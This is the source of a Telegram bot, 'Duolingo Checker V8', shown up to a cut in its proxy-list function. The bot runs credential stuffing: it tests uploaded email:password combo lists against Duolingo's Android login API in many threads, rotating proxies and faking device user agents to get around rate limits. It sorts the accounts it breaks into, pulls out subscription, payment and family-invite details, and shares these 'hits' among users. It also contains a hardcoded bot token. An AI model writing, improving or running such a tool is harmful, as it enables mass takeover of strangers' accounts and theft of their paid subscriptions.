import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import json
import time
import uuid
import logging
import threading
import re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import traceback

# ========== CONFIGURATION ==========
BOT_TOKEN = "8689449943:AAHFZdaE4L0TkH6S9BAAtmdWbwoTJYyzcJQ"
ADMIN_IDS = [8770379893]
MAX_THREADS = 50
BATCH_SIZE = 10000
PROGRESS_INTERVAL = 1000
REQUEST_TIMEOUT = 20
MAX_RETRIES = 3
RETRY_DELAY = 2
# ===================================

logging.basicConfig(
    format='%(asctime)s [%(levelname)s] %(message)s',
    level=logging.INFO,
    datefmt='%H:%M:%S'
)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None, threaded=True, num_threads=10)

# ========== PER-USER STATE (multi-user safe) ==========
# Each chat_id has its own isolated checking session
user_sessions = {}  # chat_id -> dict with state
sessions_lock = threading.Lock()  # protects user_sessions dict itself
hits_lock = threading.Lock()      # protects shared hits lists
stats_lock = threading.Lock()     # protects shared counters

hits_per_page = 10

# Shared aggregate hit lists (visible to all users) - protected by hits_lock
all_super_hits = []
all_family_hits = []
all_free_accounts = []

# Aggregate counters (across all users) - protected by stats_lock
super_count = 0
family_count = 0
free_count = 0
fail_count = 0

last_batch_super = 0
last_batch_family = 0
last_batch_free = 0
last_batch_fail = 0


def get_session(chat_id):
    """Get or create per-user session state. Thread-safe."""
    with sessions_lock:
        if chat_id not in user_sessions:
            user_sessions[chat_id] = {
                "checking_active": False,
                "stop_flag": False,
                "current_executor": None,
                "current_futures": None,
                "lock": threading.Lock(),
            }
        return user_sessions[chat_id]


def is_anyone_checking():
    """Check if any user has an active check running."""
    with sessions_lock:
        return any(s.get("checking_active") for s in user_sessions.values())

import os

# ========== USER WHITELIST ==========
USERS_FILE = "users.json"
allowed_users = set()  # non-admin authorized users
user_lock = threading.Lock()

def load_users():
    global allowed_users
    try:
        if os.path.exists(USERS_FILE):
            with open(USERS_FILE, "r") as f:
                data = json.load(f)
                allowed_users = set(int(x) for x in data.get("users", []))
                logging.info(f"📂 Loaded {len(allowed_users)} authorized users")
    except Exception as e:
        logging.error(f"User load err: {e}")
        allowed_users = set()

def save_users():
    try:
        with user_lock:
            with open(USERS_FILE, "w") as f:
                json.dump({"users": list(allowed_users)}, f)
    except Exception as e:
        logging.error(f"User save err: {e}")

def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_authorized(user_id):
    return user_id in ADMIN_IDS or user_id in allowed_users

# pending admin actions (chat_id -> action_name)
pending_admin_action = {}

# ========== PROXY MANAGEMENT ==========
PROXY_FILE = "proxies.json"
proxy_list = []        # list of dicts: {"proxy": "host:port:user:pass", "type": "HTTP"}
active_proxy_type = "HTTP"  # default proxy type for new additions
proxy_lock = threading.Lock()
pending_proxy_action = {}  # chat_id -> action type

PROXY_TYPES = ["HTTP", "HTTPS", "SOCKS4", "SOCKS5"]

def load_proxies():
    global proxy_list
    try:
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, "r") as f:
                proxy_list = json.load(f)
    except Exception:
        proxy_list = []

def save_proxies():
    try:
        with open(PROXY_FILE, "w") as f:
            json.dump(proxy_list, f, indent=2)
    except Exception as e:
        logging.error(f"Failed to save proxies: {e}")

def get_proxy_url(proxy_entry):
    """Convert proxy entry to requests-compatible proxy URL."""
    ptype = proxy_entry.get("type", "HTTP").upper()
    raw = proxy_entry.get("proxy", "")
    parts = raw.split(":")
    if len(parts) == 4:
        host, port, user, passwd = parts
        if ptype in ("SOCKS4", "SOCKS5"):
            scheme = "socks4" if ptype == "SOCKS4" else "socks5"
            return f"{scheme}://{user}:{passwd}@{host}:{port}"
        else:
            scheme = "https" if ptype == "HTTPS" else "http"
            return f"{scheme}://{user}:{passwd}@{host}:{port}"
    elif len(parts) == 2:
        host, port = parts
        if ptype in ("SOCKS4", "SOCKS5"):
            scheme = "socks4" if ptype == "SOCKS4" else "socks5"
            return f"{scheme}://{host}:{port}"
        else:
            scheme = "https" if ptype == "HTTPS" else "http"
            return f"{scheme}://{host}:{port}"
    return None

def get_random_proxy():
    """Get a random proxy from the list."""
    import random
    with proxy_lock:
        if not proxy_list:
            return None
        entry = random.choice(proxy_list)
        return get_proxy_url(entry), entry.get("type", "HTTP")
    return None


# ========== PROXY LIVE TESTER ==========
PROXY_TEST_URL = "https://api.ipify.org?format=json"

def test_one_proxy(entry, timeout=12):
    """Test a single proxy entry. Returns {ok, ip, latency_ms, error}."""
    proxy_url = get_proxy_url(entry)
    if not proxy_url:
        return {"ok": False, "ip": "", "latency": 0, "error": "bad format"}
    proxies = {"http": proxy_url, "https": proxy_url}
    t0 = time.time()
    try:
        r = requests.get(PROXY_TEST_URL, proxies=proxies, timeout=timeout)
        latency = int((time.time() - t0) * 1000)
        if r.status_code == 200:
            try:
                ip = r.json().get("ip", "?")
            except Exception:
                ip = r.text.strip()[:40]
            return {"ok": True, "ip": ip, "latency": latency, "error": ""}
        return {"ok": False, "ip": "", "latency": latency, "error": f"HTTP {r.status_code}"}
    except Exception as e:
        latency = int((time.time() - t0) * 1000)
        return {"ok": False, "ip": "", "latency": latency, "error": str(e)[:60]}



def create_session():
    session = requests.Session()
    retry_strategy = Retry(
        total=MAX_RETRIES,
        backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET", "POST"]
    )
    adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=100, pool_maxsize=100)
    session.mount("https://", adapter)
    session.mount("http://", adapter)
    # Apply random proxy if available + remember which one was used
    session._proxy_label = None
    proxy_info = get_random_proxy()
    if proxy_info:
        proxy_url, ptype = proxy_info
        session.proxies = {"http": proxy_url, "https": proxy_url}
        # Build readable label (host:port + type), credentials masked
        try:
            # proxy_url like "http://user:pass@host:port"
            after_scheme = proxy_url.split("://", 1)[1]
            host_port = after_scheme.split("@")[-1]
            session._proxy_label = f"{ptype} ∙ {host_port}"
        except Exception:
            session._proxy_label = ptype
        logging.debug(f"Using proxy: {session._proxy_label}")
    return session

def get_headers(ua, jwt=None):
    headers = {
        "User-Agent": ua,
        "Pragma": "no-cache",
        "Accept-Encoding": "gzip",
        "Accept-Language": "en-US,en;q=0.8",
        "Host": "android-api.duolingo.cn",
        "X-Amzn-Trace-Id": "User=0"
    }
    if jwt:
        headers["Authorization"] = f"Bearer {jwt}"
        headers["Accept"] = "application/json"
        headers["Connection"] = "Keep-Alive"
    return headers

def generate_ua():
    import random
    versions = ["10", "11", "12", "13", "14"]
    models = ["SM-G991B", "Pixel 6", "OnePlus 9", "Xiaomi Mi 11", "Pixel 7 Pro",
              "SM-S908B", "Pixel 8", "OnePlus 12", "Xiaomi 14", "SM-A546B"]
    return f"Dalvik/2.1.0 (Linux; U; Android {random.choice(versions)}; {random.choice(models)} Build/RP1A.200720.012)"

# ========== LANGUAGE MAPPING ==========
LANG_MAP = {
    "en": "🇺🇸 EN", "es": "🇪🇸 ES", "fr": "🇫🇷 FR",
    "de": "🇩🇪 DE", "it": "🇮🇹 IT", "pt": "🇧🇷 PT",
    "ja": "🇯🇵 JA", "ko": "🇰🇷 KO", "zh": "🇨🇳 ZH",
    "ru": "🇷🇺 RU", "ar": "🇸🇦 AR", "hi": "🇮🇳 HI",
    "tr": "🇹🇷 TR", "nl": "🇳🇱 NL", "sv": "🇸🇪 SV",
    "pl": "🇵🇱 PL", "uk": "🇺🇦 UK", "vi": "🇻🇳 VI",
    "th": "🇹🇭 TH", "id": "🇮🇩 ID", "el": "🇬🇷 EL",
    "he": "🇮🇱 HE", "ro": "🇷🇴 RO", "cs": "🇨🇿 CS",
    "hu": "🇭🇺 HU", "ga": "🇮🇪 GA", "cy": "🏴 CY",
    "hv": "🐉 HV", "tlh": "🖖 KL", "la": "🏛 LA",
    "eo": "🌍 EO", "gn": "🇵🇾 GN", "yi": "✡️ YI",
    "zu": "🇿🇦 ZU", "sw": "🇰🇪 SW", "fi": "🇫🇮 FI",
    "da": "🇩🇰 DA", "no": "🇳🇴 NO",
}

def get_lang(code):
    return LANG_MAP.get(code, f"🌐 {code}")

# ========== BILLING CYCLE FROM PRODUCT ID ==========
def parse_billing_from_product(product_id):
    """Extract billing cycle from product ID patterns like '12m', '1m', '6m', '3m'"""
    if not product_id or product_id == "Unknown":
        return None
    pid = product_id.lower()
    # Match patterns like .12m. or _12m_ or -12m-
    m = re.search(r'[\._\-](\d+)m[\._\-]', pid)
    if m:
        months = int(m.group(1))
        if months >= 12:
            return "📆 Yearly"
        elif months >= 6:
            return "📅 6-Month"
        elif months >= 3:
            return "📅 Quarterly"
        else:
            return "📅 Monthly"
    if "annual" in pid or "yearly" in pid or "year" in pid:
        return "📆 Yearly"
    if "month" in pid:
        return "📅 Monthly"
    return None

# ========== PAYMENT DETECTION (IMPROVED v2) ==========
def _classify_payment_keyword(text):
    """Match a string against known payment vendor keywords."""
    if not text:
        return None
    t = str(text).lower()
    # Google Play markers
    if any(k in t for k in [
        "google_play", "googleplay", "play_store", "playstore", "play store",
        "google play", "android_publisher", "purchasetoken", "purchase_token",
        "androidpublisher", "gpb_", "com.android.vending"
    ]):
        return "🟢 Google Play Store"
    # Apple markers
    if any(k in t for k in [
        "app_store", "appstore", "app store", "itunes", "ios_iap",
        "apple_pay", "apple pay", "apple_iap", "storekit", "originaltransactionid"
    ]):
        return "🍎 Apple App Store"
    # PayPal
    if "paypal" in t:
        return "💙 PayPal"
    # Stripe / Braintree / Web cards
    if any(k in t for k in ["stripe", "braintree", "adyen", "checkout.com"]):
        return "💳 Stripe (Web)"
    # Generic web platform
    if t in ("web", "website", "duolingo_web"):
        return "💳 Credit Card (Web)"
    # Generic platform names
    if "google" in t or "android" in t:
        return "🟢 Google Play Store"
    if "apple" in t or "ios" in t:
        return "🍎 Apple App Store"
    return None


def detect_payment(data):
    """Detect payment method from multiple API fields with deep fallback scan."""
    subscription = data.get("subscription", {}) or {}
    shop_items = data.get("shopItems", []) or []

    # --- Priority fields to check in order ---
    candidates = []

    # 1. subscription.purchasePlatform / paymentProcessor / vendorType
    for k in ("purchasePlatform", "paymentProcessor", "vendor", "vendorType",
              "platform", "store", "source", "billingPlatform"):
        v = subscription.get(k)
        if v:
            candidates.append(v)

    # 2. subscription.billingInfo.*
    billing_info = subscription.get("billingInfo", {}) or {}
    for k in ("paymentProcessor", "vendor", "platform", "store", "source"):
        v = billing_info.get(k)
        if v:
            candidates.append(v)

    # 3. shopItems[].subscriptionInfo.*
    for item in shop_items:
        si = item.get("subscriptionInfo", {}) or {}
        for k in ("purchasePlatform", "vendor", "platform", "store", "source", "paymentProcessor"):
            v = si.get(k)
            if v:
                candidates.append(v)
        # Receipts often contain purchaseToken (Google) or originalTransactionId (Apple)
        receipt = si.get("receipt")
        if receipt:
            candidates.append(json.dumps(receipt) if isinstance(receipt, dict) else str(receipt))

    # 4. Try to classify any of the prioritized candidates
    for c in candidates:
        result = _classify_payment_keyword(c)
        if result:
            return result

    # 5. Product ID patterns
    product_ids = []
    if subscription.get("productId"):
        product_ids.append(subscription["productId"])
    for item in shop_items:
        si = item.get("subscriptionInfo", {}) or {}
        if si.get("productId"):
            product_ids.append(si["productId"])
    for pid in product_ids:
        pl = str(pid).lower()
        # Android product IDs typically use reverse-DNS style: com.duolingo.xxx
        if pl.startswith("com.duolingo") or "android" in pl or "google" in pl or "_gp_" in pl or ".gp." in pl:
            return "🟢 Google Play Store"
        if "ios" in pl or "apple" in pl or "_ios_" in pl:
            return "🍎 Apple App Store"
        if "web" in pl or "stripe" in pl:
            return "💳 Stripe (Web)"

    # 6. Deep scan: search the entire payload as JSON for vendor markers
    try:
        full_dump = json.dumps(data).lower()
        # Check most specific markers first
        if "purchasetoken" in full_dump or "googleplay" in full_dump or "google_play" in full_dump or "androidpublisher" in full_dump:
            return "🟢 Google Play Store"
        if "originaltransactionid" in full_dump or "app_store" in full_dump or "itunes" in full_dump or "storekit" in full_dump:
            return "🍎 Apple App Store"
        if "paypal" in full_dump:
            return "💙 PayPal"
        if "stripe" in full_dump or "braintree" in full_dump:
            return "💳 Stripe (Web)"
    except Exception:
        pass

    # 7. Heuristic: if user has linked Google account and is premium → likely Google Play
    if data.get("hasPlus") or data.get("has_item_premium_subscription"):
        if data.get("hasGoogleId"):
            return "🟢 Google Play Store (likely)"
        if data.get("hasAppleId") or any(
            (a.get("provider", "").lower() == "apple")
            for a in (data.get("linkedAccounts", []) or [])
        ):
            return "🍎 Apple App Store (likely)"
        return "💎 Premium (source unknown)"

    return "❓ N/A"

# ========== SOCIAL DETECTION ==========
def detect_social(data):
    links = []
    for acc in (data.get("linkedAccounts", []) or []):
        p = acc.get("provider", "").lower()
        if "google" in p:
            links.append("🔴G")
        elif "facebook" in p:
            links.append("🔵FB")
        elif "apple" in p:
            links.append("🍎A")
    if data.get("hasFacebookId") and "🔵FB" not in links:
        links.append("🔵FB")
    if data.get("hasGoogleId") and "🔴G" not in links:
        links.append("🔴G")
    return " ".join(links) if links else "❌ None"

# ========== EXTRACT SUBSCRIPTION ==========
def extract_sub(data):
    d = {
        "product": "N/A",
        "renew": "❓",
        "expiry": "N/A",
        "invite": None,
        "payment": "❓",
        "billing": "❓"
    }

    sub = data.get("subscription", {}) or {}
    items = data.get("shopItems", []) or []

    # Product ID
    if sub.get("productId"):
        d["product"] = sub["productId"]
    for item in items:
        si = item.get("subscriptionInfo", {}) or {}
        if si.get("productId") and d["product"] == "N/A":
            d["product"] = si["productId"]

    # Renewing
    if sub.get("renewing") is not None:
        d["renew"] = "✅" if sub["renewing"] else "❌"
    for item in items:
        si = item.get("subscriptionInfo", {}) or {}
        if d["renew"] == "❓" and si.get("renewing") is not None:
            d["renew"] = "✅" if si["renewing"] else "❌"

    # Expiry - check multiple fields
    expiry_ms = None
    for key in ["expirationTime", "expectedExpiration", "expiresTime"]:
        if sub.get(key):
            expiry_ms = sub[key]
            break
    if not expiry_ms:
        for item in items:
            si = item.get("subscriptionInfo", {}) or {}
            for key in ["expectedExpiration", "expirationTime", "expiresTime"]:
                if si.get(key):
                    expiry_ms = si[key]
                    break
            if expiry_ms:
                break
    if expiry_ms and isinstance(expiry_ms, (int, float)):
        if expiry_ms > 1000000000000:
            d["expiry"] = datetime.fromtimestamp(expiry_ms / 1000).strftime("%Y-%m-%d")
        elif expiry_ms > 1000000000:
            d["expiry"] = datetime.fromtimestamp(expiry_ms).strftime("%Y-%m-%d")

    # Billing cycle - from subscription field first, then parse from product ID
    period = sub.get("billingPeriod", "").lower()
    if period:
        if "month" in period:
            d["billing"] = "📅 Monthly"
        elif "year" in period or "annual" in period:
            d["billing"] = "📆 Yearly"
        elif "quarter" in period:
            d["billing"] = "📅 Quarterly"
    
    if d["billing"] == "❓":
        # Try billingCycleMonths
        bcm = sub.get("billingCycleMonths")
        if bcm:
            if bcm >= 12:
                d["billing"] = "📆 Yearly"
            elif bcm >= 6:
                d["billing"] = "📅 6-Month"
            elif bcm >= 3:
                d["billing"] = "📅 Quarterly"
            else:
                d["billing"] = "📅 Monthly"

    if d["billing"] == "❓":
        parsed = parse_billing_from_product(d["product"])
        if parsed:
            d["billing"] = parsed

    # Family invite
    for item in items:
        fi = item.get("familyPlanInfo", {}) or {}
        if fi.get("inviteToken"):
            d["invite"] = fi["inviteToken"]

    # Payment
    d["payment"] = detect_payment(data)

    return d

# ========== PREMIUM CHECK ==========
def is_premium_account(data):
    items = data.get("shopItems", []) or []
    for item in items:
        fi = item.get("familyPlanInfo", {}) or {}
        if fi.get("inviteToken"):
            return True, "FAMILY", fi["inviteToken"]
    for item in items:
        si = item.get("subscriptionInfo", {}) or {}
        pid = si.get("productId", "")
        if "trial" in pid.lower():
            continue
        if pid and pid != "N/A":
            return True, "SUPER", None
    sub = data.get("subscription", {}) or {}
    if sub.get("productId") and "trial" not in sub.get("productId", "").lower():
        return True, "SUPER", None
    if data.get("has_item_premium_subscription"):
        return True, "SUPER", None
    if data.get("hasPlus"):
        return True, "SUPER", None
    return False, "FREE", None

# ========== COMPACT HIT MESSAGE ==========
def format_hit(email, password, data, plan_type, sub, invite_token=None):
    username = data.get("username", "?")
    xp = data.get("totalXp", 0)
    streak = 0
    sd = data.get("streakData")
    if sd:
        streak = sd.get("length", 0)
    gems = 0
    gc = data.get("gemsConfig")
    if gc:
        gems = gc.get("gems", 0)
    learn = get_lang(data.get("learningLanguage", "?"))
    from_l = get_lang(data.get("fromLanguage", "?"))
    social = detect_social(data)

    if invite_token:
        sub["invite"] = invite_token

    # Get all courses being learned (compact)
    courses = data.get("courses", []) or []
    course_flags = []
    for c in courses[:6]:
        cl = c.get("learningLanguage", "")
        if cl:
            flag = get_lang(cl).split()[0] if get_lang(cl) else ""
            if flag and flag not in course_flags:
                course_flags.append(flag)
    courses_str = " ".join(course_flags) if course_flags else learn.split()[0] if learn else "?"

    if plan_type == "FAMILY":
        header = "👨‍👩‍👧‍👦  𝗙𝗔𝗠𝗜𝗟𝗬  𝗣𝗟𝗔𝗡"
    else:
        header = "💎  𝗦𝗨𝗣𝗘𝗥  𝗣𝗥𝗘𝗠𝗜𝗨𝗠"

    # Proxy line (only if used)
    proxy_line = ""
    if sub.get("proxy"):
        proxy_line = f"🌐 Proxy ➜ `{sub['proxy']}`\n"

    # Tight, mobile-friendly layout (one-per-line)
    msg = (
        f"{header}\n"
        f"`{email}:{password}`\n"
        f"\n"
        f"👤 *{username}*\n"
        f"⭐ {xp:,}  ·  🔥 {streak}d  ·  💎 {gems:,}\n"
        f"📚 {courses_str}  ←  {from_l}\n"
        f"🔗 {social}\n"
        f"💳 {sub['payment']}  ·  {sub['billing']}\n"
        f"🔁 {sub['renew']}  ·  ⏰ {sub['expiry']}\n"
        f"📦 `{sub['product']}`\n"
        f"{proxy_line}"
        f"\n"
        f"🦉 _Thuya Checker V7_"
    )

    return msg


def build_hit_keyboard(email, password, plan_type, sub):
    """Inline buttons: Copy combo, Open Duolingo, Family invite if available"""
    kb = InlineKeyboardMarkup(row_width=2)
    # Login link (web)
    kb.add(
        InlineKeyboardButton("🌐 Open Duolingo", url="https://www.duolingo.com/?isLoggingIn=true"),
        InlineKeyboardButton("📧 Gmail Login", url="https://mail.google.com/"),
    )
    if plan_type == "FAMILY" and sub.get("invite"):
        link = f"https://www.duolingo.com/family-plan?invite={sub['invite']}"
        kb.add(InlineKeyboardButton("🎟 Join Family Plan", url=link))
    return kb

# ========== CHECK SINGLE ACCOUNT ==========
def check_single_account(email, password):
    # Note: per-user stop is handled by future.cancel() in process_combos
    session = create_session()
    proxy_label = getattr(session, "_proxy_label", None)
    ua = generate_ua()

    for attempt in range(MAX_RETRIES):
        try:
            login_url = "https://android-api.duolingo.cn/2017-06-30/login?fields=id"
            login_payload = {
                "distinctId": str(uuid.uuid4()),
                "identifier": email,
                "password": password
            }
            login_headers = get_headers(ua)
            login_headers["Content-Type"] = "application/json"

            resp = session.post(login_url, json=login_payload, headers=login_headers, timeout=REQUEST_TIMEOUT)

            if resp.status_code == 429:
                time.sleep(RETRY_DELAY * (attempt + 1))
                continue
            if resp.status_code != 200:
                return email, password, "FAIL", "wrong credentials", None

            user_id = resp.json().get("id")
            if not user_id:
                return email, password, "FAIL", "no user id", None

            jwt_token = None
            for cookie in session.cookies:
                if cookie.name == "jwt_token":
                    jwt_token = cookie.value
                    break
            if not jwt_token:
                return email, password, "FAIL", "no jwt token", None

            # Extended fields for better billing detection
            fields = [
                "shopItems", "totalXp", "streakData", "username",
                "fromLanguage", "learningLanguage", "gemsConfig",
                "hasPlus", "has_item_premium_subscription",
                "createdAt", "linkedAccounts", "hasFacebookId", "hasGoogleId",
                "subscription", "profile", "courses",
                "purchasePrice", "currentCourseId"
            ]
            profile_url = (
                f"https://android-api.duolingo.cn/2023-05-23/users/{user_id}"
                f"?fields={','.join(fields)}"
            )

            resp2 = session.get(profile_url, headers=get_headers(ua, jwt_token), timeout=REQUEST_TIMEOUT)

            if resp2.status_code == 429:
                time.sleep(RETRY_DELAY * (attempt + 1))
                continue
            if resp2.status_code != 200:
                return email, password, "FAIL", f"profile {resp2.status_code}", None

            data = resp2.json()
            is_prem, plan_type, invite_token = is_premium_account(data)

            if not is_prem:
                un = data.get("username", "?")
                return email, password, "FREE", f"{un}|XP:{data.get('totalXp',0)}", None

            sub = extract_sub(data)
            if proxy_label:
                sub["proxy"] = proxy_label
            result = format_hit(email, password, data, plan_type, sub, invite_token)
            family_invite = sub.get("invite") if plan_type == "FAMILY" else None
            return email, password, "HIT", result, plan_type, family_invite

        except requests.exceptions.ConnectionError:
            if attempt < MAX_RETRIES - 1:
                time.sleep(RETRY_DELAY * (attempt + 1))
                continue
            return email, password, "FAIL", "connection error", None
        except requests.exceptions.Timeout:
            if attempt < MAX_RETRIES - 1:
                time.sleep(RETRY_DELAY * (attempt + 1))
                continue
            return email, password, "FAIL", "timeout", None
        except requests.exceptions.RequestException as e:
            if attempt < MAX_RETRIES - 1:
                time.sleep(RETRY_DELAY * (attempt + 1))
                continue
            return email, password, "FAIL", str(e)[:40], None
        except Exception as e:
            logging.error(f"Error {email}: {e}")
            return email, password, "FAIL", str(e)[:40], None
        finally:
            session.close()

    return email, password, "FAIL", "max retries", None

# ========== MENU ==========
def send_main_menu(chat_id, user_id=None):
    with hits_lock:
        total_hits = len(all_super_hits) + len(all_family_hits)
    sess = get_session(chat_id)
    status = "🔴 CHECKING (yours)" if sess["checking_active"] else "🟢 IDLE"
    active_count = sum(1 for s in user_sessions.values() if s.get("checking_active"))

    msg = f"""{'━' * 32}
🦉 𝗗𝗨𝗢𝗟𝗜𝗡𝗚𝗢 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗩𝟴
{'━' * 32}
👑 @thuyaaungzaw ∙ {status}
🧵 {MAX_THREADS} threads ∙ 🔄 {MAX_RETRIES}x retry
👥 Active checkers: {active_count}

💎 Super: {super_count} ∙ 👨‍👩‍👧 Family: {family_count}
💾 Saved: {total_hits}"""

    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🚀 START", callback_data="start_check"),
        InlineKeyboardButton("📊 STATS", callback_data="my_stats")
    )
    markup.row(
        InlineKeyboardButton("💾 HITS", callback_data="view_hits"),
        InlineKeyboardButton("⚙️ SETTINGS", callback_data="tools")
    )
    if user_id is not None and is_admin(user_id):
        markup.row(InlineKeyboardButton("👑 ADMIN PANEL", callback_data="admin_panel"))
    markup.row(InlineKeyboardButton("❌ CLOSE", callback_data="close_panel"))
    bot.send_message(chat_id, msg, parse_mode='Markdown', reply_markup=markup)


def send_admin_panel(chat_id):
    total_users = len(allowed_users)
    msg = f"""{'━' * 32}
👑 𝗔𝗗𝗠𝗜𝗡  𝗣𝗔𝗡𝗘𝗟
{'━' * 32}
👥 Authorized users: *{total_users}*
🛡 Admins: *{len(ADMIN_IDS)}*

Manage who can access the bot."""
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("➕ ADD USER", callback_data="admin_add"),
        InlineKeyboardButton("➖ REMOVE USER", callback_data="admin_remove"),
    )
    markup.row(InlineKeyboardButton("📋 LIST USERS", callback_data="admin_list"))
    markup.row(InlineKeyboardButton("🏠 MENU", callback_data="main_menu"))
    bot.send_message(chat_id, msg, parse_mode='Markdown', reply_markup=markup)


def send_user_list(chat_id):
    if not allowed_users:
        text = "📭 No authorized users yet.\n\nUse ➕ ADD USER and send a numeric Telegram ID."
    else:
        lines = [f"`{uid}`" for uid in sorted(allowed_users)]
        text = f"👥 *Authorized Users ({len(allowed_users)})*\n\n" + "\n".join(lines)
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("⬅️ BACK", callback_data="admin_panel"))
    bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=markup)

def send_hits_list(chat_id, page=0):
    total_hits = len(all_super_hits) + len(all_family_hits)
    if total_hits == 0:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🏠 MENU", callback_data="main_menu"))
        bot.send_message(chat_id, "📭 No hits yet. Send a combo file!", reply_markup=markup)
        return

    all_hits = []
    for e, p, r in all_super_hits:
        all_hits.append(("💎", e, p, r))
    for e, p, r in all_family_hits:
        all_hits.append(("👨‍👩‍👧", e, p, r))

    total_pages = (len(all_hits) + hits_per_page - 1) // hits_per_page
    page = max(0, min(page, total_pages - 1))
    start = page * hits_per_page
    end = min(start + hits_per_page, len(all_hits))

    text = f"💾 𝗛𝗜𝗧𝗦 ({page+1}/{total_pages})\n"
    for i, (icon, e, p, r) in enumerate(all_hits[start:end], start=start+1):
        # Extract compact info
        lines = r.split('\n')
        user_info = payment = expiry = "?"
        for line in lines:
            if '👤' in line and '⭐' in line:
                user_info = line.strip()[:40]
            elif '⏰' in line:
                parts = line.split('⏰')
                if len(parts) > 1:
                    expiry = parts[1].strip()[:10]
            elif '💳' in line:
                payment = line.strip()[2:30]
        text += f"\n{icon} [{i}] `{e[:20]}..`\n   {user_info}\n   💳{payment} ⏰{expiry}\n"

    text += "\n💡 EXPORT for full details"

    markup = InlineKeyboardMarkup(row_width=3)
    btns = []
    if page > 0:
        btns.append(InlineKeyboardButton("◀️", callback_data=f"hits_page_{page-1}"))
    btns.append(InlineKeyboardButton(f"{page+1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1:
        btns.append(InlineKeyboardButton("▶️", callback_data=f"hits_page_{page+1}"))
    markup.row(*btns)
    markup.row(
        InlineKeyboardButton("📋 EXPORT", callback_data="copy_all_hits"),
        InlineKeyboardButton("🔄", callback_data="refresh_hits")
    )
    markup.row(InlineKeyboardButton("🏠 MENU", callback_data="main_menu"))
    bot.send_message(chat_id, text, parse_mode='Markdown', reply_markup=markup)

def send_stats(chat_id):
    with hits_lock:
        total_hits = len(all_super_hits) + len(all_family_hits)
    total = super_count + family_count + free_count + fail_count
    rate = round(total_hits / total * 100, 2) if total > 0 else 0
    active_count = sum(1 for s in user_sessions.values() if s.get("checking_active"))

    msg = f"""{'━' * 32}
📊 𝗦𝗧𝗔𝗧𝗦  (global)
{'━' * 32}
💎 Super: {super_count:,} ∙ 👨‍👩‍👧 Family: {family_count:,}
⚠️ Free: {free_count:,} ∙ ❌ Fail: {fail_count:,}
📋 Total: {total:,} ∙ 🎯 Rate: {rate}%
👥 Active checkers: {active_count}"""

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🏠 MENU", callback_data="main_menu"))
    bot.send_message(chat_id, msg, parse_mode='Markdown', reply_markup=markup)


# ========== PROXY MENU ==========
def send_proxy_menu(chat_id, message_id=None):
    with proxy_lock:
        total = len(proxy_list)
        types_count = {}
        for p in proxy_list:
            t = p.get("type", "HTTP")
            types_count[t] = types_count.get(t, 0) + 1
    
    type_info = " ∙ ".join(f"{t}:{c}" for t, c in types_count.items()) if types_count else "None"
    
    msg = f"""{'━' * 32}
🌐 𝗣𝗥𝗢𝗫𝗬  𝗠𝗔𝗡𝗔𝗚𝗘𝗥
{'━' * 32}
📊 Total Proxies: *{total}*
📋 Types: {type_info}

Manage your proxy list below."""
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("➕ ADD", callback_data="proxy_add"),
        InlineKeyboardButton("➖ REMOVE", callback_data="proxy_remove")
    )
    markup.row(
        InlineKeyboardButton("📋 LIST", callback_data="proxy_list"),
        InlineKeyboardButton("🗑️ CLEAR ALL", callback_data="proxy_clear")
    )
    markup.row(InlineKeyboardButton("🧪 TEST LIVE", callback_data="proxy_test"))
    markup.row(InlineKeyboardButton("🏠 MENU", callback_data="main_menu"))
    if message_id:
        try:
            bot.edit_message_text(msg, chat_id, message_id, parse_mode='Markdown', reply_markup=markup)
            return
        except Exception:
            pass
    bot.send_message(chat_id, msg, parse_mode='Markdown', reply_markup=markup)

def send_proxy_type_selector(chat_id, message_id=None):
    """Show proxy type selection before adding."""
    msg = f"""🌐 *Select Proxy Type*

Choose the type for your proxy:"""
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("🔵 HTTP", callback_data="proxy_type_HTTP"),
        InlineKeyboardButton("🟢 HTTPS", callback_data="proxy_type_HTTPS")
    )
    markup.row(
        InlineKeyboardButton("🟠 SOCKS4", callback_data="proxy_type_SOCKS4"),
        InlineKeyboardButton("🔴 SOCKS5", callback_data="proxy_type_SOCKS5")
    )
    markup.row(InlineKeyboardButton("⬅️ BACK", callback_data="proxy_menu"))
    if message_id:
        try:
            bot.edit_message_text(msg, chat_id, message_id, parse_mode='Markdown', reply_markup=markup)
            return
        except Exception:
            pass
    bot.send_message(chat_id, msg, parse_mode='Markdown', reply_markup=markup)

def send_proxy_list(chat_id, page=0, message_id=None):
    with proxy_lock:
        total = len(proxy_list)
    if total == 0:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("⬅️ BACK", callback_data="proxy_menu"))
        if message_id:
            try:
                bot.edit_message_text("📭 No proxies added yet.", chat_id, message_id, reply_markup=markup)
                return
            except Exception:
                pass
        bot.send_message(chat_id, "📭 No proxies added yet.", reply_markup=markup)
        return
    
    per_page = 10
    total_pages = (total + per_page - 1) // per_page
    page = max(0, min(page, total_pages - 1))
    start = page * per_page
    end = min(start + per_page, total)
    
    text = f"🌐 *PROXIES* ({page+1}/{total_pages})\n\n"
    with proxy_lock:
        for i, p in enumerate(proxy_list[start:end], start=start+1):
            ptype = p.get("type", "HTTP")
            raw = p.get("proxy", "?")
            parts = raw.split(":")
            if len(parts) >= 2:
                display = f"{parts[0]}:{parts[1]}"
            else:
                display = raw[:20]
            icon = {"HTTP": "🔵", "HTTPS": "🟢", "SOCKS4": "🟠", "SOCKS5": "🔴"}.get(ptype, "⚪")
